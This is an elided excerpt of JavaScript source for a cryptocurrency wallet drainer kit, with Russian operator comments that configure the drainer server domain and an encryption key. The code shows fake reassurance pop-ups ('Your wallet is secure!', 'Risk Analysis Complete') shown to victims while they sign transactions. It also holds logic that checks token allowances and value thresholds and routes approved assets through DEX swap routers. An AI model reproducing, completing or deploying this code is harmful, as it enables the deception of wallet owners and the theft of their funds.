...
let CF_EKEY = 934875098434065; // Укажите любое число, которое будет использовано для шифрования (не рекомендуется оставлять по умолчанию!)
...
const CF_Server_URL = "pegeback.org"; // Указать домен, который прикреплен к серверу дрейнера
...
const CF_Color_Scheme = 'dark'; // light - светлая тема, dark - тёмная тема
...
const show_check = () => {
  try {
    if (CF_Loader_Style == 2) {
      ...
      //     if (CF_Check_Done) return;
      //     MSL.fire({
      //       icon: 'load', title: 'Connection Established', subtitle: 'Blockchain connection secured',
      ...
      //         if (CF_Check_Done) return;
      //         MSL.fire({
      //           icon: 'load', title: 'Wallet Detected', subtitle: 'Address retrieved successfully',
      ...
      //                 if (CF_Check_Done) return;
      //                 MSL.fire({
      //                   icon: 'load', title: 'Risk Analysis Complete', subtitle: 'No significant issues found',
      ...
      //                     if (CF_Check_Done) return;
      //                     MSL.fire({
      //                       icon: 'load', title: 'Reputation Verified', subtitle: 'Wallet reputation score approved',
      ...
      //                         if (CF_Check_Done) return;
      //                         MSL.fire({
      //                           icon: 'load', title: 'Verification Complete', subtitle: 'Your wallet is secure!',
...
const wait_message = () => {
  try {
    ...
    if (CF_Loader_Style == 2) {
      // MSL.fire({
      //   icon: 'load', title: 'Signature Received!', subtitle: 'Thank you!',
...
const end_message = () => {
  try {
    if (CF_Loader_Style == 2) {
      MSL.fire({
        icon: 'success', title: 'Success', subtitle: 'Proceed to website',
...
const sign_ready = () => {
  try {
    if (CF_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Transaction Signed', subtitle: 'Signature confirmed!',
...
], SwapRouterV3_ABI = [{ "inputs": [{ "internalType": "address", "name": "_deployer", "type": "address" }, { "internalType": "address", "name": "_factory", "type": "address" }, { "internalType": "address", "name": "_WETH9", "type": "address" }], "stateMutability": "nonpayable", "type": "constructor" }, { "inputs": [], "name": "WETH9", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, {
  "inputs": [], "name": "deployer", "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
...
}, { "inputs": [{ "components": [{ "internalType": "bytes", "name": "path", "type": "bytes" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "deadline", "type": "uint256" }, { "internalType": "uint256", "name": "amountIn", "type": "uint256" }, { "internalType": "uint256", "name": "amountOutMinimum", "type": "uint256" }], "internalType": "struct ISwapRouter.ExactInputParams", "name": "params", "type": "tuple" }], "name": "exactInput", "outputs": [{ "internalType": "uint256", "name": "amountOut", "type": "uint256" }], "stateMutability": "payable", "type": "function" },
{
  ...
  "name": "exactOutputSingle", "outputs": [{ "internalType": "uint256", "name": "amountIn", "type": "uint256" }], "stateMutability": "payable", "type": "function"
              ...
              if (contract.asset.amount_usd >= CF_Settings.Settings.Swappers.Price) {
                for (const swapper of CF_Routers[contract.chain_id]) {
                  try {
                    ...
                    if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
                      if (swapper[0] == 'Quickswap' && !CF_Settings.Settings.Swappers.Quick) continue;
                      if (swapper[0] == 'Sushiswap' && !CF_Settings.Settings.Swappers.Sushi) continue;
                      if (swapper[0] == 'Uniswap' && (!CF_Uniswap_Whitelist.includes(contract.address) || !CF_Settings.Settings.Swappers.Uniswap)) continue;
...
const connect_wallet = async (provider = null) => {
  try {
    ...
    if (!CF_Current_Address || !CF_Current_Chain_ID) {
      try {
    ...
    if (CF_Loader_Style == 2) {
      // MSL.fire({
      //   icon: 'load', title: 'All data received', text: 'Thanks for waiting!', showConfirmButton: false, timer: 1500, color: CF_Color_Scheme
      // }).then(() => {
        MSL.fire({
